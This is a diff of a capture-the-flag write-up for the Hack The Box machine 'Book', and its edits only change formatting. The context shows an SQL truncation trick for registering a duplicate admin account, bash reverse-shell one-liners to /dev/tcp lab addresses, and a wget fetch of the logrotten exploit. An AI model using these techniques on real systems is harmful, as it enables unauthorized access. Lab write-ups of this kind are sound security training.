@@ -182,6 +182,7 @@ If the backend DBMS is MySQL, which is usually the case here, we should be able 
 
 The email is limited to 20 characters. We may try to register an account beginning with “admin@book.htb”, then adding spaces until the 20th character, and finally one more character, e.g. "1".     
 Doing so, we may obtain another admin account that the site will consider as being the admin account “admin@book.htb” without flagging it during the registration as alreading existing.      
+
 Let's give it a try.   
 
 If we do it directly in the form on the web site, it refuses this e-mail address and we can not validate the account. Actually, space chars are not accepted here, but we can try to run the query from Burp.   
@@ -545,7 +546,7 @@ bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
 bash -i >& /dev/tcp/10.10.14.17/666 0>&1
 ~~~
 
-Of course we save it and make it executable. Now, we download the exploit on the target and compile it with `$ gcc logrotten.c -o logrotten` and make it executable:
+Of course we save it and make it executable. Now, we download the exploit on the target and compile it with **`$ gcc logrotten.c -o logrotten`** and make it executable:
 
 ~~~
 reader@book:~$ wget http://10.10.14.18/logrotten.c
